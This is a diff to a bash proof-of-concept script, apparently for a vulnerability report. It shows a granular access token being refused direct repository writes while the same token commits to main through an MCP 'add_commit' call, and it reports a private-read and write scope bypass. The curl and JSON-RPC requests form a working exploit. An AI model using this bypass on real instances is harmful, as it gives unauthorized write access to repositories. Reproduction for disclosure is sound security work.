@@ -152,6 +152,51 @@ if [[ "$MCP_FILE_CONTENT" == *"$FIXTURE_VALUE"* ]]; then
   FIXTURE_MATCH=true
 fi
 
+echo "===== REPOSITORY WRITE CONTROL: direct API with same GPAT must be denied ====="
+REPO_WRITE_VALUE="H1_MCP_WRITE_PROOF_$STAMP"
+DIRECT_WRITE_BODY="$OUT/direct-repo-write-body.json"
+DIRECT_WRITE_STATUS="$(curl -sS -o "$DIRECT_WRITE_BODY" -w '%{http_code}' \
+  --request POST \
+  --header "PRIVATE-TOKEN: $GPAT" \
+  --data-urlencode "branch=main" \
+  --data-urlencode "commit_message=Direct GPAT write control" \
+  --data-urlencode "content=$REPO_WRITE_VALUE" \
+  "$BASE/api/v4/projects/$PROJECT_ID/repository/files/h1-direct-write-control.txt")"
+printf '%s\n' "$DIRECT_WRITE_STATUS" >"$OUT/direct-repo-write-status.txt"
+if [[ "$DIRECT_WRITE_STATUS" == "201" ]]; then
+  echo "ISOLATION_INVALID: direct repository write accepted token without push_code"
+  exit 27
+fi
+
+echo "===== REPOSITORY WRITE EXPLOIT: same MCP-only GPAT calls add_commit ====="
+MCP_COMMIT_BODY="$(jq -cn --arg p "$PROJECT_PATH" --arg content "$REPO_WRITE_VALUE" '{
+  jsonrpc:"2.0",
+  id:"h1-commit",
+  method:"tools/call",
+  params:{
+    name:"add_commit",
+    arguments:{
+      project_id:$p,
+      branch:"main",
+      commit_message:"H1 MCP granular PAT repository write proof",
+      actions:[{action:"create",file_path:"h1-mcp-write-proof.txt",content:$content}]
+    }
+  }
+}')"
+MCP_COMMIT="$(curl -sS --fail-with-body \
+  -H "PRIVATE-TOKEN: $GPAT" -H 'Content-Type: application/json' \
+  --data-binary "$MCP_COMMIT_BODY" "$BASE/api/v4/mcp")"
+printf '%s\n' "$MCP_COMMIT" | tee "$OUT/mcp-add-commit.json"
+
+VERIFY_WRITE_BODY="$OUT/mcp-write-verify.txt"
+VERIFY_WRITE_STATUS="$(curl -sS -o "$VERIFY_WRITE_BODY" -w '%{http_code}' \
+  -H "PRIVATE-TOKEN: $ROOT_TOKEN" \
+  "$BASE/api/v4/projects/$PROJECT_ID/repository/files/h1-mcp-write-proof.txt/raw?ref=main")"
+MCP_COMMIT_MATCH=false
+if [[ "$VERIFY_WRITE_STATUS" == "200" ]] && grep -Fqx "$REPO_WRITE_VALUE" "$VERIFY_WRITE_BODY"; then
+  MCP_COMMIT_MATCH=true
+fi
+
 echo "===== WRITE IMPACT SETUP: create one owned test issue ====="
 ISSUE_JSON="$(api "$ROOT_TOKEN" POST "/projects/$PROJECT_ID/issues" \
   --data-urlencode "title=H1 MCP granular PAT write proof $STAMP")"
@@ -217,13 +262,15 @@ WRITE_COUNT="$(jq --arg body "$NOTE_BODY" '[.[] | select(.body == $body)] | leng
   echo "MCP returned project path: ${MCP_PATH:-<none>}"
   echo "Direct repository-file API status: $DIRECT_FILE_STATUS"
   echo "MCP private fixture recovered: $FIXTURE_MATCH"
+  echo "Direct repository write status: $DIRECT_WRITE_STATUS"
+  echo "MCP repository write verified: $MCP_COMMIT_MATCH"
   echo "MCP REST get_issue control isError: $(jq -r '.result.isError // "no-result"' <<<"$MCP_REST_CONTROL")"
   echo "Direct GraphQL create-note result: $(jq -c '.data.createNote // null' <<<"$DIRECT_NOTE")"
   echo "MCP-created matching note count: $WRITE_COUNT"
 } | tee "$OUT/summary.txt"
 
-if [[ "$MCP_PATH" == "$PROJECT_PATH" && "$DIRECT_FILE_STATUS" != "200" && "$FIXTURE_MATCH" == true && "$WRITE_COUNT" -ge 1 ]]; then
-  echo "H1_RESULT=PASS granular-token repository-read plus write scope bypass via MCP GraphQL tools" | tee -a "$OUT/summary.txt"
+if [[ "$MCP_PATH" == "$PROJECT_PATH" && "$DIRECT_FILE_STATUS" != "200" && "$FIXTURE_MATCH" == true && "$DIRECT_WRITE_STATUS" != "201" && "$MCP_COMMIT_MATCH" == true && "$WRITE_COUNT" -ge 1 ]]; then
+  echo "H1_RESULT=PASS granular-token private-repository read + repository-write + note-write scope bypass via MCP GraphQL tools" | tee -a "$OUT/summary.txt"
   exit 0
 fi
 
